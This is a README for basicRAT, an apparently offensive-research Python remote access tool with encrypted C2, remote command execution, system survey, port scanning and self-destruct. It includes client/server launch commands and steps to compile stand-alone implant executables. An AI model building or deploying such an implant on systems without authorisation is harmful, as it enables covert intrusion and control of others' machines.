# basicRAT

This is a cross-platform Python 3.6.x Remote Administration Tool (RAT). Currently still a work in progress, and gets hacked on as time allows. See the `binaries/` folder for prebuilt client executables.

**Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Features
* Cross-platform (Windows, Linux, and macOS)
* AES-256 encrypted C2 with D-H exchange
* Accepts connection from multiple clients
* Command execution
* Standard utilities (cat, ls, pwd, unzip, wget)
* System survey
* Self-destruct
* Primitive port scanning
* Client reconnect

## Usage

### Client
```
C:\>basicRAT_client.exe --ip 127.0.0.1 --port 1337 --timeout 30
```
Where `ip` is the basicRAT server IP address, `port` is the server listening port, and `timeout` is the number of seconds the client waits to attempt a reconnect to the server (if disconnected). These are the default values if not specified, you will likely need to supply at least an IP and port if using basicRAT outside of your local system.

### Server
```
$ python basicRAT_server.py --port 1337

## Build your own stand-alone executable
If you'd rather not use one the prebuilt binaries, you can easily create your own executable like so:

On Windows you will need:
  * [Python 3.6.x](https://www.python.org/downloads/)
  * [Nuitka](http://nuitka.net/)
    * On Windows you will need a C compiler, see the [Nutika usage page](https://github.com/kayhayen/Nuitka#usage).
  * [PyWin32 for Python 3.6.x](https://sourceforge.net/projects/pywin32/files/pywin32/)
  * pefile & PyCryptodome - `C:\> python -m pip install pefile pycryptodome`

Then run `nuitka --recurse-all basicRAT_client.py` inside the `basicRAT/` repo, which should create a `basicRAT_client.exe` stand-alone PE (portable executable).

On Linux/macOS you will need:
  * [Python 3.6.x](https://www.python.org/downloads/)
  * Nuitka & PyCryptodome - `$ pip install nuitka pycryptodome`

Then run `nuitka --recurse-all basicRAT_client.py` inside the `basicRAT/` repo, which should create a `basicRAT_client.exe` (the file extension is unimportant) which should create a stand-alone ELF/Mach-O executable.
